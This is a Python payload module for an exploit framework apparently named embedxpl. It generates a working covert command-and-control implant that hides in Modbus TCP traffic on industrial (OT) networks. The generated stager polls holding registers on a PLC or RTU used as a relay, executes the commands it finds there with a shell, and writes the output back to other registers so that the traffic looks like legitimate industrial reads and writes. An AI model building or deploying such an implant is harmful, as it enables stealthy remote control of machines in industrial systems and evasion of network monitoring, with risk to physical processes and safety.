"""Modbus TCP Covert Channel Payload.

Usa registros Modbus como canal de exfiltração/C2 em redes OT.
Dados são codificados em holding registers (FC3/FC16) — tráfego
aparece como leitura/escrita industrial legítima.

Protocolo:
  C2 escreve comando codificado nos registros 0x0100-0x01FF (Write Multiple Registers FC16)
  Implant lê os registros (Read Holding Registers FC3), decodifica, executa
  Implant escreve saída nos registros 0x0200-0x02FF
  C2 lê saída (FC3)
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Modbus Covert Channel",
        "description": "Covert C2 via Modbus TCP registers — appears as industrial traffic.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "BROKER_IP": {
            "description": "Modbus server (PLC/RTU) IP used as covert relay",
            "required": True,
            "default": "",
            "value": "",
        },
        "PORT": {"description": "Modbus TCP port", "required": False, "default": "502", "value": "502"},
        "UNIT_ID": {"description": "Modbus unit ID", "required": False, "default": "1", "value": "1"},
        "CMD_REG": {"description": "Starting register for commands (hex)", "required": False,
                    "default": "0x0100", "value": "0x0100"},
        "OUT_REG": {"description": "Starting register for output (hex)", "required": False,
                    "default": "0x0200", "value": "0x0200"},
    }

    def generate(self) -> bytes:
        broker = self.options["BROKER_IP"]["value"]
        port   = self.options["PORT"]["value"]
        uid    = self.options["UNIT_ID"]["value"]
        cmd_reg = int(self.options["CMD_REG"]["value"], 16)
        out_reg = int(self.options["OUT_REG"]["value"], 16)

        stager = f"""#!/usr/bin/env python3
# Modbus C2 implant
import struct,socket,subprocess,time,os

def mb_read(s,uid,reg,count):
    txid=os.urandom(2)
    pkt=txid+b'\\x00\\x00\\x00\\x06'+bytes([uid,3])+struct.pack('>HH',reg,count)
    s.sendall(pkt)
    r=s.recv(256)
    if len(r)<9:return b''
    byte_count=r[8]
    return r[9:9+byte_count]

def mb_write(s,uid,reg,data):
    # pad to register boundary (2 bytes each)
    if len(data)%2:data+=b'\\x00'
    count=len(data)//2
    txid=os.urandom(2)
    pkt=(txid+b'\\x00\\x00'+struct.pack('>H',7+len(data))+
         bytes([uid,16])+struct.pack('>HHB',reg,count,len(data))+data)
    s.sendall(pkt)
    s.recv(12)

CMD_REG={cmd_reg}; OUT_REG={out_reg}

while True:
    try:
        s=socket.create_connection(('{broker}',{port}),timeout=5)
        while True:
            raw=mb_read(s,{uid},CMD_REG,64)
            if raw and raw != b'\\x00'*len(raw):
                cmd=raw.rstrip(b'\\x00').decode(errors='ignore').strip()
                if cmd:
                    try:out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=15)
                    except Exception as e:out=str(e).encode()
                    # write result back
                    mb_write(s,{uid},OUT_REG,(out[:125]+b'\\x00').ljust(126,b'\\x00'))
                    # clear command register
                    mb_write(s,{uid},CMD_REG,b'\\x00'*128)
            time.sleep(2)
        s.close()
    except Exception:
        time.sleep(10)
"""
        return stager.encode()
